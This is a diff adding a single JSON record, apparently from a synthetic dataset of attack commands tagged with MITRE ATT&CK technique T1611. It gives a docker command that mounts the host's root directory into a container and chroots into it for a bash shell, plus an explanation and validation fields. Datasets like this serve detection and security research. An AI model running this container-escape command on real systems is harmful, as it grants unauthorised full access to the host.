@@ -1,0 +1,21 @@
+{
+  "id": "SYN-ZSH-T1611-f02cfc9c-d9d95bc9",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "zsh",
+  "command": "docker run --rm -v /:/hostroot ubuntu chroot /hostroot /bin/bash",
+  "explanation": "Starts a new container and uses the host's root directory as its root, effectively giving access to the host's file system.",
+  "rationale_steps": [
+    "Mount the host's root directory within the container.",
+    "Change root to the host's root directory and start a bash shell."
+  ],
+  "source_prompt_hash": "f02cfc9c",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:29:32.063558Z"
+}
